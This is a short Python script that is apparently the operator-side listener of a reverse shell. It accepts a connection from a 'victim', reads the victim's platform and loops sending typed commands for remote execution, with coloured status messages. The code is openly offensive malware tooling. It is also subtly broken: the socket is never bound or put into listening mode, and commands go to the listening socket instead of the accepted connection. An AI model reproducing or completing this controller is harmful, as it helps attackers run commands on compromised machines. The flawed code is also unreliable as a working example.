import socket
from colorama import Fore

red, blue, green, reset = (
        Fore.LIGHTRED_EX,
        Fore.LIGHTBLUE_EX,
        Fore.LIGHTGREEN_EX,
        Fore.RESET,
    )
yellow, magenta = Fore.LIGHTYELLOW_EX, Fore.LIGHTMAGENTA_EX
def connect(Connection_Type: str):
    if Connection_Type == "TCP":
        Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    elif Connection_Type == "UDP":
        Connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("[" + blue + '+' + reset + "]  Making Connection")
    try:
        Victim, Address = Connection.accept()

        os = Victim.recv(1024).decode('UTF-8')
        print("[" + blue + '+' + reset + "]  Got Platfrom from victim")
        Connected = True
        while Connected:
            Command = str(
                input("{Victim}@{os} ".format(Victim=Address, os=os)))
            Connection.send(Command.encode("UTF-8"))
            print(Connection.recv(1024).decode("UTF-8"))
    except:
        Connected = False
        print("[" + red + '-' + reset + 
              "] Connection Failed.Victim Might Be Offline Try Again Later")
        return False
